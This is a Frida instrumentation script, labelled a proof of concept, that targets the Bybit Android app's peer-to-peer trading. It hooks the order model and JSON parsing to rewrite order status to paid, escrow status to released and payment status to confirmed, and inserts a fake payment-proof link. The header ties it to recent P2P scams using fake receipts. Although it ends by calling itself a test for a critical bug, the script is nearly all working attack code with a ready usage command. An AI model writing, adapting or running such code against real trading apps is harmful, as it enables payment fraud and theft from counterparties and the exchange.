/* 
   BYBIT P2P BYPASS PoC (Frida) - UPDATED NOV 2025
   Target: com.bybit.app
   Goal: Spoof P2P order status to "PAID" + force escrow release
   
   Usage: frida -U -f com.bybit.app -l p2p_bypass_v2.js --no-pause
   
   Based on: Recent P2P scams (Nov 2025) + fake payment receipts
*/

Java.perform(function () {
    console.log("[*] Bybit P2P Bypass Hook v2.0 - Starting...");

    // Strategy A: Hook Order Status (Direct Class)
    try {
        var OrderClass = Java.use("com.bybit.p2p.model.Order");
        
        OrderClass.getStatus.implementation = function () {
            var original = this.getStatus();
            console.log("[+] Order.getStatus() called. Original: " + original);
            console.log("[!] Spoofing to PAID (20)");
            return 20;
        };
        
        // Force escrow release
        if (OrderClass.setEscrowReleased) {
            OrderClass.setEscrowReleased.implementation = function(released) {
                console.log("[!] Forcing escrowReleased = TRUE");
                return this.setEscrowReleased(true);
            };
        }
        
        console.log("[+] Order class hooked successfully!");
    } catch (e) {
        console.log("[-] Order class not found: " + e);
    }

    // Strategy B: Hook JSON Response Parsing (GSON)
    try {
        var Gson = Java.use("com.google.gson.Gson");
        
        Gson.fromJson.overload('java.lang.String', 'java.lang.Class').implementation = function (json, clazz) {
            // Check if P2P order response
            if (json.includes('"status":') && (json.includes('orderId') || json.includes('p2p'))) {
                console.log("=".repeat(60));
                console.log("[*] INTERCEPTED P2P ORDER RESPONSE");
                console.log("[*] Class: " + clazz.getName());
                
                // Extract key fields
                var orderIdMatch = json.match(/"orderId":"([^"]+)"/);
                var statusMatch = json.match(/"status":(\d+)/);
                var escrowMatch = json.match(/"escrowStatus":(\d+)/);
                var paymentProofMatch = json.match(/"paymentProof":"([^"]*)"/);
                
                if (orderIdMatch) console.log("[*] Order ID: " + orderIdMatch[1]);
                if (statusMatch) console.log("[*] Original Status: " + statusMatch[1]);
                if (escrowMatch) console.log("[*] Escrow Status: " + escrowMatch[1]);
                if (paymentProofMatch) console.log("[*] Payment Proof: " + paymentProofMatch[1]);
                
                // ATTACK: Modify JSON
                var modifiedJson = json;
                modifiedJson = modifiedJson.replace(/"status":\s*\d+/g, '"status":20');  // PAID
                modifiedJson = modifiedJson.replace(/"orderStatus":\s*\d+/g, '"orderStatus":20');
                modifiedJson = modifiedJson.replace(/"escrowStatus":\s*\d+/g, '"escrowStatus":30'); // RELEASED
                modifiedJson = modifiedJson.replace(/"paymentStatus":\s*\d+/g, '"paymentStatus":1'); // CONFIRMED
                modifiedJson = modifiedJson.replace(/"paymentProof":""/g, '"paymentProof":"https://fake.com/proof.jpg"');
                
                console.log("[!] SPOOFED Status -> 20 (PAID)");
                console.log("[!] SPOOFED Escrow -> 30 (RELEASED)");
                console.log("[!] SPOOFED Payment Proof -> fake URL");
                console.log("=".repeat(60));
                
                var result = this.fromJson(modifiedJson, clazz);
                
                // Force escrow release on Order object
                try {
                    if (result.setEscrowReleased) {
                        result.setEscrowReleased(true);
                        console.log("[!] Forced escrowReleased = TRUE on object");
                    }
                } catch (err) {}
                
                return result;
            }
            
            return this.fromJson(json, clazz);
        };
        
        console.log("[+] GSON hook installed successfully!");
    } catch (e) {
        console.log("[-] GSON hook failed: " + e);
    }
    
    console.log("[*] All hooks installed. Create a P2P order to test.");
    console.log("[*] If escrow releases without real payment -> CRITICAL BUG!");
});
